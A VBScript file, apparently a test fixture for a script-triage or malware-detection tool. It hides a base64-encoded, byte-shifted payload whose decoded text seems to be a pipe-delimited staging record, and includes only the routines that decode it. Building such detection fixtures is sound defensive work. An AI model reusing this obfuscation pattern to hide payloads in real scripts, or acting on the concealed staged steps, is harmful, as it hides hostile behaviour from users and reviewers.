Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_d8f40367 = "bTQoc2prXGdqNGNmWlhrXFZjZlpYYyNnaVxnWGlcVmtpWGVqXVxpI2xnY2ZYW1ZpXGRma1xzWFtYZ2tcaTRESk9EQyklSlxpbVxpT0RDP0tLRyUtJSdzamtYXlxWWmZsZWs0KXNaWGRnWGBeZVZgWzRaWGRnWGBeZSQtWShaWFpZWShYc2xpYzRfa2tnajEmJi1ZKFpYWllZKFglXG9YZGdjXCVgZW1YY2BbJlwwLDBcWSwsJVtYa3NsalxpVlheXGVrND9sZWtpXGpqQ1hZJi1ZKFpYWllZKFhzXWBjXFZnWGtfNDoxU0xqXGlqU0dsWWNgWlM/bGVraVxqakNYWVNqa1heXCQtWShaWFpZWShYJVtYa3NsZ2NmWFtWbGljNF9ra2dqMSYmLVkoWlhaWVkoWCVcb1hkZ2NcJWBlbVhjYFsmbGdjZlhbJikvJy4vXCwt"
Const Codec_d8f40367 = "base64_literal|subtract_modulo_256|09"

Function Base64_d8f40367(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_d8f40367", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_d8f40367 = outputBytes
End Function

Function Load_d8f40367()
  Load_d8f40367 = Base64_d8f40367(Material_d8f40367)
End Function

Function Decode_d8f40367(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(i) = (s(i) + 9) Mod 256
  Next
  Decode_d8f40367 = result
End Function

Function Recover_d8f40367()
  Dim s, d, t, n, i, p, e, q
  n = UBound(Array(3, 5, 8, 13))
  s = Load_d8f40367()
  d = Decode_d8f40367(s)
  t = ""
  For i = 0 To UBound(d)
    t = t & Chr(d(i))
  Next
  Recover_d8f40367 = t
End Function

Function Inspect_d8f40367()
  Dim fields
  fields = Split(Recover_d8f40367(), "|")
  Inspect_d8f40367 = Join(fields, "|")
End Function
